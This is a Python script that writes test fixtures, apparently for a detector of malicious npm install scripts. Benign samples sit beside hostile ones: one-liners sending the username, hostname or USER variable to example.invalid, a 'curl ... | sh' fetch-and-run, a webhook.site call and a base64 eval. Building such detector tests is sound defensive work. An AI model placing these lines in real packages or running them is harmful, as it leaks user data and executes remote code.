import os

HERE = os.path.dirname(os.path.abspath(__file__))

FILES = {
    "script_exfil.txt":
        'node -e "const h=require(\'https\'),o=require(\'os\');'
        ' h.get(\'https://example.invalid?u=\'+o.userInfo().username)"\n',
    "script_benign.txt":
        "node ./scripts/postinstall.js\n",
    "script_curl.txt":
        "curl -s http://example.invalid/x | sh\n",
    "js_host_net.js":
        'require("https").get("https://example.invalid/" + require("os").hostname());\n',
    "js_webhook_exec.js":
        'require("child_process").exec("curl https://webhook.site/x");\n',
    "js_benign.js":
        "function add(a, b) { return a + b; }\n",
    "js_env_only.js":
        "module.exports = process.env.HOME;\n",
    "js_eval_buffer.js":
        'eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());\n',
    "js_obfuscated_only.js":
        "var _0xabc = 1;\n",
    "js_net_env_exec.js":
        'require("https").get("https://example.invalid?u=" + process.env.USER);'
        ' require("child_process").exec("id");\n',
}

for name, text in FILES.items():
    with open(os.path.join(HERE, name), "w", encoding="utf-8", newline="\n") as handle:
        handle.write(text)

print("wrote", len(FILES), "files")
